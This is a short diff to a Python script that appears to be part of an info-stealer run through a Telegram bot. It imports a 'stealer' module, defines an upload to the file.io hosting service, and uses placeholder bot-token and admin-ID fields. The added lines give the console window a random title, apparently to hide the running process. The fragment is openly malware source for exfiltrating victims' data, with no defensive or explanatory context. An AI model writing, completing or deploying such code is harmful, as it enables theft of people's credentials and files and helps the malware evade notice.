@@ -3,11 +3,15 @@ import telebot
 import requests
 import stealer
 from telebot import types
+import string
 
 ADMIN_ID = "ID" # Your telegram id
 FILE_IO_API_URL = "https://file.io"
 
 bot = telebot.TeleBot("TOKEN") # Your bot token
+
+rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
+os.system(f"title {rand_title}")
 
 def upload_to_fileio(archive_path):
     with open(archive_path, "rb") as file:
